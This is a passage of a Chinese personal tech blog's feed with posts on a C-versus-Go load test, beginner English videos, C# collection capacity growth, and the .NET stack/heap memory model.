&lt;h2 id=&quot;测试对比&quot;&gt;&lt;a href=&quot;#测试对比&quot; class=&quot;headerlink&quot; title=&quot;测试对比&quot;&gt;&lt;/a&gt;测试对比&lt;/h2&gt;&lt;p&gt;我使用的是jmeter测试，首先测试c实现的服务,分别用100,200,300线程并发，每线程访问10。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-1.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-2.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-3.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;C版实现越测数据越看不下去了，出错率越来越大。接着我测golang实现，我分别用300线程，1000线程和5000线程并发，每线程访问10次。测试数据如下:&lt;br&gt;&lt;img src=&quot;/img/go-4.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-5.png&quot; alt=&quot;c&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/go-6.png&quot; alt=&quot;c&quot;&gt;&lt;br&gt;除了响应时间延长，其它都比较稳定，出错率全为0.难道这是传说中的后端神器，难道老板再也不用担心网站访问人数太多当机了，难道我也转golang开发。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>英语入门视频推荐</title>
    <link href="http://binyanbin.github.io/2016/05/06/english-1/"/>
    <id>http://binyanbin.github.io/2016/05/06/english-1/</id>
    <published>2016-05-05T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Learn-English-with-Jennifer&quot;&gt;&lt;a href=&quot;#Learn-English-with-Jennifer&quot; class=&quot;headerlink&quot; title=&quot;Learn English with Jennifer&quot;&gt;&lt;/a&gt;Learn English with Jennifer&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-1.png&quot; alt=&quot;Learn English with Jennifer&quot;&gt;&lt;br&gt;一个美国英语教师教授一个俄罗斯人英语的教学视频，只有英文字幕，不用看字幕也很容易看懂听懂，非常合适初学者，作为入门视频课程非常合适。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index335.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;extro-English&quot;&gt;&lt;a href=&quot;#extro-English&quot; class=&quot;headerlink&quot; title=&quot;extro English&quot;&gt;&lt;/a&gt;extro English&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/english-2.jpg&quot; alt=&quot;extro English&quot;&gt;&lt;br&gt;这是一个搞笑情景剧,描述几个年轻人浪漫而搞笑的生活故事,可以让你从头笑到尾,只有英文字幕,超级易懂,适合初级或中级能力的学习,对于提高口语和听力具有很好的帮助。&lt;br&gt;&lt;a href=&quot;http://video.1speaking.com/view/index418.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;观看地址&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;坚持学习英语也有一年多时间，除了在线外教学习，还看一些原版英语课程和英语电视剧，下面我分享2个非常非常非常合适初学者的系列视频’Learn English with Jennifer’和’extro English’。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>C#由内存模型说性能2 数组与集合</title>
    <link href="http://binyanbin.github.io/2016/05/02/CSharp-2/"/>
    <id>http://binyanbin.github.io/2016/05/02/CSharp-2/</id>
    <published>2016-05-01T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的&lt;/p&gt;
&lt;h2 id=&quot;数组与集合&quot;&gt;&lt;a href=&quot;#数组与集合&quot; class=&quot;headerlink&quot; title=&quot;数组与集合&quot;&gt;&lt;/a&gt;数组与集合&lt;/h2&gt;&lt;p&gt;大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;集合如何实现动态扩容&quot;&gt;&lt;a href=&quot;#集合如何实现动态扩容&quot; class=&quot;headerlink&quot; title=&quot;集合如何实现动态扩容&quot;&gt;&lt;/a&gt;集合如何实现动态扩容&lt;/h2&gt;&lt;p&gt;拿ArrayList和List为例,实际的代码大概如下:&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; 增加元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Add&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//超出集合大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size == &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.EnsureCapacity(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items[&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size] = &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._version++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; 设置容量大小 默认容量为4,超出容量则扩容2倍&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;EnsureCapacity&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; min&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length &amp;lt; min)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	&lt;span class=&quot;comment&quot;&gt;//默认容量为4,超出容量则扩容2倍&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; num = (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) ? &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; : (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length * &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (num &amp;lt; min)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            num = min;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.Capacity = num;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; 设置容量大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; Capacity&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;get&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; != &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &amp;lt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArgumentOutOfRangeException(&lt;span class=&quot;string&quot;&gt;&quot;value&quot;&lt;/span&gt;, Environment.GetResourceString(&lt;span class=&quot;string&quot;&gt;&quot;ArgumentOutOfRange_SmallCapacity&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;[] array = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;[&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;];&lt;span class=&quot;comment&quot;&gt;//重新分配内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    Array.Copy(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, array, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items = array;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;List&amp;lt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&amp;gt; list = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; List&amp;lt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&amp;gt;();&lt;span class=&quot;comment&quot;&gt;//list.Capacity=0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;无论是List,ArrayList或其它集合,不过是对Array的一层包装,也由此可以断定集合的性能肯定不如Array。&lt;/li&gt;
&lt;li&gt;集合的扩容过程增加CPU的损耗和GC的压力，对于问题的严重性就取决于实际应用的场合，如果在高并发的应用下存在大量这操作那问题就变得严重多了。&lt;/li&gt;
&lt;li&gt;使用:对集合初始化的时候指定容量,如果可以直接使用Array代替集合。&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的&lt;/p&gt;
&lt;h2 id=&quot;数组与集合&quot;&gt;&lt;a href=&quot;#数组与集合&quot; class=&quot;headerlink&quot; title=&quot;数组与集合&quot;&gt;&lt;/a&gt;数组与集合&lt;/h2&gt;&lt;p&gt;大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>.net由内存模型说性能1</title>
    <link href="http://binyanbin.github.io/2016/04/30/CSharp-1/"/>
    <id>http://binyanbin.github.io/2016/04/30/CSharp-1/</id>
    <published>2016-04-29T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;.net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。&lt;/p&gt;
&lt;h2 id=&quot;内存模型-堆与栈&quot;&gt;&lt;a href=&quot;#内存模型-堆与栈&quot; class=&quot;headerlink&quot; title=&quot;内存模型:堆与栈&quot;&gt;&lt;/a&gt;内存模型:堆与栈&lt;/h2&gt;&lt;p&gt;C#内存主要有两类：Stack和Heap&lt;br&gt;Stack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。&lt;br&gt;Heap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。&lt;br&gt;&lt;img src=&quot;/img/CSharp-1.jpg&quot; alt=&quot;效果&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;值类型与引用类型&quot;&gt;&lt;a href=&quot;#值类型与引用类型&quot; class=&quot;headerlink&quot; title=&quot;值类型与引用类型&quot;&gt;&lt;/a&gt;值类型与引用类型&lt;/h2&gt;&lt;p&gt;值类型的数据和内存在同一个位置，而引用类型是一个指向内存的指针。也就是对Stack和Heap的实际使用。&lt;br&gt;&lt;img src=&quot;/img/CSharp-2.jpg&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-3.jpg&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;除了Object和String,其它都是值类型。值类型的性能要略优于引用类型，它只需要一次访问内存就可拿到数据。&lt;/p&gt;
&lt;h2 id=&quot;装箱与拆箱&quot;&gt;&lt;a href=&quot;#装箱与拆箱&quot; class=&quot;headerlink&quot; title=&quot;装箱与拆箱&quot;&gt;&lt;/a&gt;装箱与拆箱&lt;/h2&gt;&lt;p&gt;值类型与引用类型进行类型转换时会产生装箱和拆箱操作。&lt;br&gt;&lt;img src=&quot;/img/CSharp-4.jpg&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;非必要时尽量避免这类操作，会对性能一定的影响。&lt;/p&gt;
